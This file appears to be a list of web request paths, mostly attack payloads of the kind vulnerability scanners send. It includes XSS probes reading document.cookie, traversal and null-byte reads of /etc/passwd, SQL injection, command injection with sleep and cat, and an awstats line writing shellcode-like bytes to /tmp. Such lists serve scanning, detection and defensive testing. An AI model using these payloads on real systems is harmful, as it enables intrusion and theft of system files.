"/<meta http-equiv=set-cookie content=""testgfbr=7014"">"
"/index.php?err=3&email=\""><script>alert(document.cookie)</script>"
/examples/jsp/num/admin/configset.php?settings_dir=/etc/passwd\x00
/cgi-bin/main.cgi?board=free_board&command=down_load&filename=../../../../../../../../../../etc/passwd
"/help.php?q=""sleep\x097\x09#"
"/ywaxntrx.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/examples/jsp/jsp2/el/home/search.asp?nchannel='1
/moore's_law/
/cgi-perl/texis.exe/junk
/scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331909370
/claroline/resourcelinker/resourcelinker.inc.php?clarolinerepositorysys=/etc/passwd\x00
/zqqemp6j.htm?<script>cross_site_scripting.nasl</script>
/examples/jsp/num/remindpasswd
/examples/jsp/colors/wiki/edit.php?page=sandbox&suck_url=../kernel/config_inc.php&do_suck=h
"/main.php?stuff=""\x0adel\x09q48139983\x09#"
/cgi-bin/fileseek2.cgi?head=;cat /etc/passwd|&foot=
/examples/jsp/jsp2/jspx/index.php?string='
/javascript/info.exe
/javascript/.passwd.pfx
/scripts/index.php?include_files[]=&include_files[query_string]=/etc/passwd
/tukodz3j.cgi?<script>cross_site_scripting.nasl</script>
"/awstats/awstats.pl?migrate=|echo;/bin/echo -en ""vj\0001j\0002\0211\0341j\0001jfx\0133\0315\0200\0222"" >> /tmp/ldlchhikup0;echo|awstats247374.txt"
/ows-bin/r.cgi?file=../../../../../../../../../../etc/passwd
"<script>document.cookie=""testtbjy=7334;""</script>"
"/jnt3f86c.kspx?<script>document.cookie=""testcmax=9270;""</script>"
"/search.aspx?keywords=<script>alert(""413385588094"")</script>"
/en-us/jnv890lt.nsf?<script>cross_site_scripting.nasl</script>
/main.php?stuff=;sleep 9 #
/help.php?q='|sleep 8 #
/examples/jsp/colors/cgiip.exe/wservice=wsbroker1/webutil/ping.p
/cacti/htmlscript?../../../../../../../../../etc/passwd
"/help.php?q=""&sleep\x099\x09#"
